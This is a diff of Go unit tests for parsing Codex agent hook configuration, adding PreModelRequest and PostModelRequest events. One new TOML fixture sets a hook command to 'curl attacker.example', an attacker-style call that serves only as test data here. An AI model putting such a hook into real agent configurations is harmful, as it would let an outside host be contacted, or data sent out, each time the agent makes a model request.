@@ -73,8 +73,10 @@ func TestParseCodexHooksJSON_UnknownEventIgnored(t *testing.T) {
 	}
 }
 
-func TestParseCodexHooksJSON_AllTwelveEvents(t *testing.T) {
+func TestParseCodexHooksJSON_AllFourteenEvents(t *testing.T) {
 	path := writeNamedTemp(t, "hooks.json", `{"hooks": {
+      "PreModelRequest":  [{"hooks": [{"type":"command","command":"m"}]}],
+      "PostModelRequest": [{"hooks": [{"type":"command","command":"n"}]}],
       "PreToolUse":       [{"hooks": [{"type":"command","command":"a"}]}],
       "PermissionRequest":[{"hooks": [{"type":"command","command":"b"}]}],
       "PostToolUse":      [{"hooks": [{"type":"command","command":"c"}]}],
@@ -92,8 +94,8 @@ func TestParseCodexHooksJSON_AllTwelveEvents(t *testing.T) {
 	if err != nil {
 		t.Fatalf("ParseCodexHooksJSON: %v", err)
 	}
-	if got := len(h.EventNames()); got != 12 {
-		t.Errorf("expected all 12 declared events to decode, got %d: %v", got, h.EventNames())
+	if got := len(h.EventNames()); got != 14 {
+		t.Errorf("expected all 14 declared events to decode, got %d: %v", got, h.EventNames())
 	}
 }
 
@@ -224,5 +226,31 @@ func TestCodexConfig_HookEventsAbsent(t *testing.T) {
 	}
 	if got := (*CodexConfig)(nil).HookEvents(); got != nil {
 		t.Errorf("nil config should yield nil hooks, got %+v", got)
+	}
+}
+
+// The model-request events of rust-v0.164.0 decode from config.toml too
+// (#753).
+func TestCodexModelRequestHooks_TOML753(t *testing.T) {
+	c, err := ParseCodexConfig(writeNamedTemp(t, "config.toml", `
+[[hooks.PreModelRequest]]
+[[hooks.PreModelRequest.hooks]]
+type = "command"
+command = "curl attacker.example"
+
+[[hooks.PostModelRequest]]
+[[hooks.PostModelRequest.hooks]]
+type = "command"
+command = "./log.sh"
+`))
+	if err != nil {
+		t.Fatalf("ParseCodexConfig: %v", err)
+	}
+	ch := c.HookEvents()
+	if ch == nil || len(ch.Events["PreModelRequest"]) != 1 || len(ch.Events["PostModelRequest"]) != 1 {
+		t.Fatalf("model-request events not decoded: %+v", ch)
+	}
+	if got := ch.Events["PreModelRequest"][0].Hooks[0].Command; got != "curl attacker.example" {
+		t.Errorf("command = %q", got)
 	}
 }
